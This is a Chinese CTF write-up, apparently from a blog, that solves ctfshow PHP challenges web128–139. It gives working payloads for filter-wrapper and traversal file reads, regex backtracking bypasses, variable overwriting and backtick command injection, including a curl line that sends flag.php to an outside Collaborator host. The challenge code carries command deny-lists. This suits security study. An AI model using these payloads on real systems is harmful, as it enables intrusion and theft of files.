&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>call_user_func</code>函数在前面我们学过， 把第一个参数作为回调函数调用。</p>
<p><code>check</code>函数则是对<code>str</code>进行一次过滤，返回没有数字和小写字母的字符</p>
<p>这题就是跟着佬wp复现了，首先我们要了解俩个函数<code>gettext</code>和<code>get_defined_vars</code></p>
<p>源代码中所有需要多语言支持的（需要翻译的）字符串都修改为使用<code>gettext</code>函数包装起来。为了方便也可以使用下划线<code>_</code>，即在php代码中，<code>gettext(&quot;nihao&quot;)</code>是等同于<code>_(&quot;nihao&quot;)</code>。因此虽然其过滤了小写字母，但是其没过滤<code>_</code>。其次是<code>get_defined_vars</code>函数，返回由所有已定义变量所组成的数组</p>
<p>可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">?f1&#x3D;_&amp;f2&#x3D;get_defined_vars

其效果就等同于
var_dump(call_user_func(call_user_func(_,get_defined_vars)))  &#x2F;&#x2F;这里的 &#39;get_defined_vars&#39; 将被翻译成当前语言环境中的对应字符串，然后作为回调函数的名字传递给 call_user_func。
&#x3D;&gt; var_dump(call_user_func(get_defined_vars));   &#x2F;&#x2F;回调get_defined_vars函数
&#x3D;&gt; var_dump(get_defined_vars);  &#x2F;&#x2F;执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221734271.png"></p>
<h3 id="web129"><a href="#web129" class="headerlink" title="web129"></a>web129</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET[&#39;f&#39;]))&#123;
  $f &#x3D; $_GET[&#39;f&#39;];
  if(stripos($f, &#39;ctfshow&#39;)&gt;0)&#123;
    echo readfile($f);
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">首先先来了解俩个函数
stripos — 查找字符串首次出现的位置（不区分大小写）
------------------------语法-------------------------------
stripos(string,find,start)
参数	描述
string	必需。规定被搜索的字符串。
find	必需。规定要查找的字符。
start	可选。规定开始搜索的位置。
-------------------------相关函数------------------------------------
strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）
strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）
strrpos() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）

readfile() 函数读取一个文件，并写入到输出缓冲。
-------------------------语法-------------------------------
readfile(filename,include_path,context)
参数	描述
filename	必需。规定要读取的文件。
include_path	可选。如果您还想在 include_path（在 php.ini 中）中搜索文件的话，请设置该参数为 &#39;1&#39;。
context	可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>就是需要$f中可以查到’ctfshow’这个字符。然后再通过readfile函数读取这个文件，我们可以通过俩种方式，</p>
<h4 id="第一种、伪协议读取"><a href="#第一种、伪协议读取" class="headerlink" title="第一种、伪协议读取"></a>第一种、伪协议读取</h4><pre class="line-numbers language-none"><code class="language-none">f&#x3D;php:&#x2F;&#x2F;filter&#x2F;|ctfshow&#x2F;resource&#x3D;flag.php
or
f&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode|ctfshow&#x2F;resource&#x3D;flag.php  &#x2F;&#x2F;以base64形式读取，相对应的，方式还有很多。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>打开源代码可以看到flag.php的内容</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401221833652.png"></p>
<h4 id="第二种、目录遍历"><a href="#第二种、目录遍历" class="headerlink" title="第二种、目录遍历"></a>第二种、目录遍历</h4><p>通过目录遍历来允许访问目标目录结构之外的文件，访问到flag.php的内容，该路径通过多次跳出目录结构最终指向了 <code>var/www/html/flag.php</code>。</p>
<pre class="line-numbers language-none"><code class="language-none">f&#x3D;&#x2F;ctfshow&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php  &#x2F;&#x2F;直接读取<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>同上，打开源代码可以找到flag的值。</p>
<h3 id="web130"><a href="#web130" class="headerlink" title="web130"></a>web130</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
if(isset($_POST[&#39;f&#39;]))&#123;
  $f &#x3D; $_POST[&#39;f&#39;];

  if(preg_match(&#39;&#x2F;.+?ctfshow&#x2F;is&#39;, $f))&#123;
    die(&#39;bye!&#39;);
  &#125;
  if(stripos($f, &#39;ctfshow&#39;) &#x3D;&#x3D;&#x3D; FALSE)&#123;
    die(&#39;bye!!&#39;);
  &#125;
  echo $flag;

&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="第一种、pcre回溯"><a href="#第一种、pcre回溯" class="headerlink" title="第一种、pcre回溯"></a>第一种、pcre回溯</h4><p>这题结合代码一边<code>stripos函数</code>要让你有ctfshow，否则就会触发<code>die函数</code>，但是如果你有ctfshow又会触发<code>preg_match函数</code>从而引起<code>die函数</code>的触发，这里就要利用到<code>preg_match函数</code>的另一个绕过方式—-<code>pcre回溯限制次数绕过</code></p>
<blockquote>
<p>PCRE（Perl Compatible Regular Expressions）是一种正则表达式库，它使用回溯法来匹配模式。回溯法在匹配失败时会尝试不同的路径，这可能导致在某些情况下耗费大量的时间和资源。                                          回溯限制是为了防止正则表达式匹配时发生无限循环或导致系统资源耗尽。然而，有些情况下，攻击者可能会尝试绕过回溯限制，导致正则表达式引擎消耗大量时间而不断尝试匹配。                                                             基本的原理通常包括利用正则表达式中的复杂结构和重复元素，使得引擎在尝试匹配时需要进行大量的回溯。攻击者可能会通过构造特定的输入，使得正则表达式引擎在回溯时达到限制次数，然后通过巧妙的修改输入，绕过这一限制，导致正则表达式引擎消耗大量的资源。</p>
<p>贪婪模式下，pattern部分被匹配，但是后半部分没匹配（匹配“用力过猛”，把后面的部分也匹配过了）时匹配式回退的操作，在出现<em>、+时容易产生。<br>非贪婪模式下，字符串部分被匹配，但后半部分没匹配完全（匹配“用力不够”，需要通配符再匹配一定的长度），在出现</em>?、+?时容易产生。</p>
</blockquote>
<p>所以我们可以编写下面的代码(pycharm)</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">import requests

url &#x3D; &quot;http:&#x2F;&#x2F;c582f986-75b4-4071-b510-84deb566bb3f.challenge.ctf.show&#x2F;&quot;
data &#x3D; &#123;
    &#39;f&#39;:&#39;abcd&#39;*250000+&#39;ctfshow&#39;
&#125;
r &#x3D; requests.post(url,data&#x3D;data)
print(r.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401231126355.png"></p>
<h4 id="第二种、数组绕过"><a href="#第二种、数组绕过" class="headerlink" title="第二种、数组绕过"></a>第二种、数组绕过</h4><p>preg_match不识别数组，否则返回false，并且<code>stripos函数</code>会返回<code>null</code>,<code>null!=false</code>,所以可以绕过stripos函数</p>
<p>所以我们可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">f[]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>此时preg_match不识别数组，返回false，所以绕过了这个die函数，然后stripos函数也会返回NULL，同时NULL!&#x3D;false，所以不触发die函数。</p>
<h4 id="第三种、php特性"><a href="#第三种、php特性" class="headerlink" title="第三种、php特性"></a>第三种、php特性</h4><pre class="line-numbers language-none"><code class="language-none">在正则表达式中: . 表示任意单个字符，+ 表示必须匹配1次或多次，+? 表示重复1次或更多次，并且其皆在ctfshow前面。所以在ctfshow前面必须有字符，才会导致触发die函数。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>所以构造playload：</p>
<pre class="line-numbers language-none"><code class="language-none">f&#x3D;ctfshow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="web131"><a href="#web131" class="headerlink" title="web131"></a>web131</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&quot;flag.php&quot;);
if(isset($_POST[&#39;f&#39;]))&#123;
  $f &#x3D; (String)$_POST[&#39;f&#39;];
  if(preg_match(&#39;&#x2F;.+?ctfshow&#x2F;is&#39;, $f))&#123;
    die(&#39;bye!&#39;);
  &#125;
  if(stripos($f,&#39;36Dctfshow&#39;) &#x3D;&#x3D;&#x3D; FALSE)&#123;
    die(&#39;bye!!&#39;);
  &#125;
  echo $flag;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>与上一题相比，其对将从<code>$_POST</code>数组中获取到的数据转换为字符串类型，再加上<code>stripos函数</code>中需要查询36Dctfshow，这就导致了ctfshow前面出现了<code>字符</code>，所以导致了<code>preg_match函数</code>判断为真，触发了die函数。对其使用pcre回溯</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">import requests

url &#x3D; &quot;http:&#x2F;&#x2F;ed6dabb2-edf3-48d0-9da0-b2bc4ce1c139.challenge.ctf.show&#x2F;&quot;
data &#x3D; &#123;
    &#39;f&#39;:&#39;abcd&#39;*250000+&#39;36Dctfshow&#39;
&#125;
r &#x3D; requests.post(url,data&#x3D;data)
print(r.text)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401231912317.png"></p>
<h3 id="web132"><a href="#web132" class="headerlink" title="web132"></a>web132</h3><p>打开就是一个网站</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401231928587.png"></p>
<p>通过御剑扫出有隐藏文件(admin和index.php?.php)</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401232001714.png"></p>
<p>分别进行访问，先去index.php?.php下进行访问查看，额发现就是回到了主页面</p>
<p>再去<code>admin</code>下进行访问查看，发现是一段源码，对源码进行分析</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
include(&quot;flag.php&quot;);
highlight_file(__FILE__);

if(isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;]) &amp;&amp; isset($_GET[&#39;code&#39;]))&#123;
  $username &#x3D; (String)$_GET[&#39;username&#39;];
  $password &#x3D; (String)$_GET[&#39;password&#39;];
  $code &#x3D; (String)$_GET[&#39;code&#39;];
  if($code &#x3D;&#x3D;&#x3D; mt_rand(1,0x36D) &amp;&amp; $password &#x3D;&#x3D;&#x3D; $flag || $username &#x3D;&#x3D;&#x3D;&quot;admin&quot;)&#123;  
    if($code &#x3D;&#x3D; &#39;admin&#39;)&#123;
      echo $flag;
    &#125;
    
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>首先对传入的<code>username</code>、<code>password</code>、<code>code</code>进行字符串型的强类型转换。</p>
<p>然后运用了mt_rand函数，其次是逻辑关系<code>&amp;&amp;</code>与<code>||</code>。<strong>前者需要前后的条件都为true，才会返回true</strong>；<strong>后者则是只要前后一个为true，就会返回true。</strong>（||<code>优先级低于</code>&amp;&amp;）然后当<code>$code</code>为<code>admin</code>时就会得到flag</p>
<pre class="line-numbers language-none"><code class="language-none">mt_rand() 函数使用 Mersenne Twister 算法生成随机整数。
-------------------语法-----------------------------------
mt_rand();
or
mt_rand(min,max);
参数	描述
min	可选。规定返回的最小数。默认是 0。
max	可选。规定返回的最大数。默认是 mt_getrandmax()。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>即先进行<code>&amp;&amp;</code>运算时，<code>$code</code>与<code>$password</code>都为假，那么则代表此时判断为<code>false || $username ===&quot;admin&quot;</code>，那么进行<code>||</code>运算，此时当<code>$username===&quot;admin&quot;</code>满足时，即代表该if判断此时为<code>if( false || true)</code>，即有一个<code>true</code>，那么该if判断就成立，然后确保下一个if判断中<code>$code == &#39;admin&#39;</code>即可拿到flag                                                                                                                                                  所以我们可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">username&#x3D;admin&amp;password&#x3D;1&amp;code&#x3D;admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401232014991.png"></p>
<h3 id="web133"><a href="#web133" class="headerlink" title="web133"></a>web133</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
&#x2F;&#x2F;flag.php
if($F &#x3D; @$_GET[&#39;F&#39;])&#123;
  if(!preg_match(&#39;&#x2F;system|nc|wget|exec|passthru|netcat&#x2F;i&#39;, $F))&#123;
    eval(substr($F,0,6));
  &#125;else&#123;
    die(&quot;6个字母都还不够呀?!&quot;);
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在该代码中，首先过滤了几个日常使用的命令执行函数。并且限制了f的写入数量，因为<code>substr</code>函数只截断前六个字符，并且也给出了提示，flag在flag.php中</p>
<pre class="line-numbers language-none"><code class="language-none">substr() 函数返回字符串的一部分。
注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。
-----------------------语法---------------------------------
substr(string,start,length)
参数	   描述
string	必需。规定要返回其中一部分的字符串。
start	必需。规定在字符串的何处开始。
正数 - 在字符串的指定位置开始
负数 - 在从字符串结尾的指定位置开始
0 - 在字符串中的第一个字符处开始
length	可选。规定要返回的字符串长度。默认是直到字符串的结尾。
正数 - 从 start 参数所在的位置返回
负数 - 从字符串末端返回<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>按官方给的WP去复现了一遍(太菜了·····)</p>
<p><code>if($F = @$_GET[&#39;F&#39;])</code>不同于以往的GET传参，本题如果我们传参变量<code>$F</code>本身，会发生变量覆盖，以大佬给的实验命令为例，说一下我的理解(可能不对\ &#x2F;)。**?F&#x3D;<code>$F</code>;+sleep 3**,首先我们需要了解<strong>是shell_exec()函数的缩写，</strong>然后substr函数是提取前6位字符，将**<code>$F</code>;+<strong>给提取了出去，此时eval执行的命令为</strong><code>$F</code>;<strong>而$F此时所传的参即是</strong><code>$F</code>;+sleep 3**。所以我们最后执行的代码应该是 **``$F`;+sleep 3`**。</p>
<pre class="line-numbers language-none"><code class="language-none">即
当我们为F赋参  F&#x3D;&#96;$F&#96;;+sleep(3)
substr函数截断得前六个字符&#96;$F &#96;;+
eval(substr($F,0,6));&#x3D;&gt;eval(&#96;$F &#96;;);&#x3D;&gt;eval(&#96;&#96;$F&#96;+;sleep 3&#96;);
由于&#96;&#96;是shell_exec()函数的缩写。所以执行了&#96;$F&#96;;+sleep 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>且本题是无回显RCE。因此，可以利用<code>curl -F</code>函数将flag文件上传到Burp的 Collaborator Client</p>
<p>链接点击<code>复制到剪贴板</code>获得</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401241118058.png"></p>
<p>所以可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">?F&#x3D;&#96;$F&#96;;+curl -X POST -F xx&#x3D;@flag.php http:&#x2F;&#x2F;vyxgokflbcdeezkngy6lpopzsqyjm8.burpcollaborator.net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到flag</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401241105666.png"></p>
<h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
highlight_file(__FILE__);
$key1 &#x3D; 0;
$key2 &#x3D; 0;
if(isset($_GET[&#39;key1&#39;]) || isset($_GET[&#39;key2&#39;]) || isset($_POST[&#39;key1&#39;]) || isset($_POST[&#39;key2&#39;])) &#123;
  die(&quot;nonononono&quot;);
&#125;
@parse_str($_SERVER[&#39;QUERY_STRING&#39;]);
extract($_POST);
if($key1 &#x3D;&#x3D; &#39;36d&#39; &amp;&amp; $key2 &#x3D;&#x3D; &#39;36d&#39;) &#123;
  die(file_get_contents(&#39;flag.php&#39;));
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>$_SERVER[‘QUERY_STRING’]</code>会获取查询语句即GET传参?的语句</p>
<pre class="line-numbers language-none"><code class="language-none">extract() 函数从数组中将变量导入到当前的符号表。
-----------------------------语法-----------------------------------------
extract(array,extract_rules,prefix)
参数	描述
array	必需。规定要使用的数组。

extract_rules	可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。
prefix	可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。
该参数规定了前缀。前缀和数组键名之间会自动加上一个下划线。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>extract函数具体展现</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401241742833.png"></p>
<p>在该题中，如果我们<code>get</code>或<code>POST</code>传参就会触发<code>die函数</code>，所以我们需要先通过<code>$_SERVER[‘QUERY_STRING’]</code>将<code>?</code>后的请求解析为<code>变量</code>。然后通过extract函数特性将数组中的变量导入到当前的符号表。即可以实现<code>key1=36d和key2=36d</code>。其次利用到的就是extract函数中的变量为<code>$_POST</code>，利用变量覆盖，我们可以传参<code>_POST</code>从而实现上面这几步，所以我们可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">GET:  _POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401242123962.png"></p>
<h3 id="web135"><a href="#web135" class="headerlink" title="web135"></a>web135</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
&#x2F;&#x2F;flag.php
if($F &#x3D; @$_GET[&#39;F&#39;])&#123;
  if(!preg_match(&#39;&#x2F;system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head&#x2F;i&#39;, $F))&#123;
    eval(substr($F,0,6));
  &#125;else&#123;
    die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;);
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>相较于<code>web133</code>，该题过滤掉了更多命令执行语句，在<code>web133</code>中我们使用到的<code>curl</code>也没法用咯，只能另想方法 可以通过cp命令将flag.php文件复制到另一个文件中，然后我们通过访问该文件拿到flag，其他的跟<code>web133</code>同理，我们可以构造</p>
<pre class="line-numbers language-none"><code class="language-none">F&#x3D;&#96;$F&#96;; cp flag.php 1.txt       &#x2F;&#x2F;这样确保前六位是&#96;$F&#96;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401251629678.png"></p>
<p>同理还有其他命令比如mv命令，当我们将flag.php移入其他文件中，如果没有该文件就会创建一个新文件，因此我们可以访问该新文件拿到flag</p>
<pre class="line-numbers language-none"><code class="language-none">GET:  F&#x3D;&#96;$F&#96;; mv flag.php 111.txt  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>结果与上图一致</p>
<h3 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
function check($x)&#123;
  if(preg_match(&#39;&#x2F;\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp&#x2F;i&#39;, $x))&#123;
    die(&#39;too young too simple sometimes naive!&#39;);
  &#125;
&#125;
if(isset($_GET[&#39;c&#39;]))&#123;
  $c&#x3D;$_GET[&#39;c&#39;];
  check($c);
  exec($c);
&#125;
else&#123;
  highlight_file(__FILE__);
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>check函数</code>对一些特殊符号以及指令进行了过滤，如果含有就会触发die函数。而该代码的步骤就是先通过check函数对<code>c</code>进行检查，然后通过<code>exec</code>进行命令执行。                                                                                                                        未被过滤的符号</p>
<pre class="line-numbers language-none"><code class="language-none">&quot;&#39;()+,-&#x2F;:;&#x3D;ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]_&#96;abcdefghijklmnopqrstuvwxyz|~<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>由于其将<code>*</code>和<code>?</code>都过滤了，导致我们就算构造<code>cat f*</code>也没法用，且其结果无回显，<code>&gt;</code>被过滤导致我们无法写入其他文件，而<code>mv</code>和<code>cp</code>被过滤也导致了其他文件更没法写入。这里要用到Linux中的一个命令<code>tee</code></p>
<pre class="line-numbers language-none"><code class="language-none">Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注意，在该题中<code>|</code>，管道符是没被禁止的，所以当我们在管道符前面<code>ls /</code>所扫出的信息，通过<code>|</code>隔着<code>tee 1</code>可以将<code>ls /</code>的信息写入<code>1</code>文件中。从而让我们了解到此时根目录有哪些文件。然后如果有flag文件，则通过<code>cat</code>命令拿到flag。                                                                                                                                                                                    此时根目录下文件</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401251725516.png"></p>
<p>flag的值</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401251726377.png"></p>
<pre class="line-numbers language-none"><code class="language-none">即最终构造
GET:  c&#x3D;ls &#x2F;|tee 1
GET:  c&#x3D;cat &#x2F;f149_15_h3r3|tee 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="web137"><a href="#web137" class="headerlink" title="web137"></a>web137</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
class ctfshow
&#123;
  function __wakeup()&#123;
    die(&quot;private class&quot;);
  &#125;
  static function getFlag()&#123;
    echo file_get_contents(&quot;flag.php&quot;);
  &#125;
&#125;

call_user_func($_POST[&#39;ctfshow&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过最后的POST传参，我们可以考虑到，本题是与<code>call_user_func</code>该函数有关。在前面我们学到过，</p>
<pre class="line-numbers language-none"><code class="language-none">call_user_func()  调用回调函数，并把一个数组参数作为回调函数的参数
但同时call_user_func还有很多用法，具体可看
https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;function.call-user-func.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401262105467.png"></p>
<p>至此，我们可以构造类似的参，以此获得flag.php中的内容</p>
<pre class="line-numbers language-none"><code class="language-none">POST:  ctfshow&#x3D;ctfshow::getFlag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>从而拿到flag</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401262055611.png"></p>
<h3 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
error_reporting(0);
highlight_file(__FILE__);
class ctfshow
&#123;
  function __wakeup()&#123;
    die(&quot;private class&quot;);
  &#125;
  static function getFlag()&#123;
    echo file_get_contents(&quot;flag.php&quot;);
  &#125;
&#125;
if(strripos($_POST[&#39;ctfshow&#39;], &quot;:&quot;)&gt;-1)&#123;
  die(&quot;private function&quot;);
&#125;
call_user_func($_POST[&#39;ctfshow&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>相较于上题对<code>POST传的参ctfshow</code>进行了一次查询，即查询在传入的参<code>ctfshow</code>中，如果出现了<code>:</code>就会触发die函数。</p>
<pre class="line-numbers language-none"><code class="language-none">strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里利用到的是<code>call_user_func函数</code>里面可以传数组，当第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用该方法从而执行方法内的代码。</p>
<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401272039782.png"></p>
<p>其内涵就像</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">&#x2F;&#x2F; 用户传入的参数，类似于 $_POST[&#39;ctfshow&#39;]
$user_input &#x3D; [
    &#39;ctfshow&#39;, &#x2F;&#x2F; 类名
    &#39;getFlag&#39; &#x2F;&#x2F; 方法名
];
call_user_func([$user_input[0], $user_input[1]]); &#x2F;&#x2F;就等同于如果用户传入的参数是一个字符串，直接调用该函数；而如果是一个数组，则将数组的第一个元素作为类名，第二个元素作为方法名，然后调用该方法。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以构造下面从而拿到flag</p>
<pre class="line-numbers language-none"><code class="language-none">ctfshow[0]&#x3D;ctfshow&amp;ctfshow[1]&#x3D;getFlag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202401262129609.png"></p>
<h3 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h3><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
error_reporting(0);
function check($x)&#123;
  if(preg_match(&#39;&#x2F;\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp&#x2F;i&#39;, $x))&#123;
    die(&#39;too young too simple sometimes naive!&#39;);
  &#125;
&#125;
if(isset($_GET[&#39;c&#39;]))&#123;
  $c&#x3D;$_GET[&#39;c&#39;];
  check($c);
  exec($c);
&#125;
else&#123;
  highlight_file(__FILE__);
&#125;
?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>与<code>web136</code>相比，确实看着像没什么变化，但是按照<code>web136</code>的指令是没法实现的，这里按照官方WP给的脚本复现了一遍。里面涉及到了<code>awk命令</code> ，其是一种处理文本文件的语言，是一个强大的文本分析工具<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-awk.html">Linux awk 命令 | 菜鸟教程 (runoob.com)</a></p>
<p>第一个脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">import requests
import time
import string
str&#x3D;string.ascii_letters+string.digits #生成所有字母与数字[a-zA-Z0-9]
result&#x3D;&quot;&quot;
for i in range(1,5):  &#x2F;&#x2F; # 假设最多有5个目录
   key&#x3D;0
   for j in range(1,15):  # 假设目录名最多有15个字符
      if key&#x3D;&#x3D;1:
         break
      for n in str:
         payload&#x3D;&quot;if [ &#96;ls &#x2F;|awk &#39;NR&#x3D;&#x3D;&#123;0&#125;&#39;|cut -c &#123;1&#125;&#96; &#x3D;&#x3D; &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n)
         #print(payload)
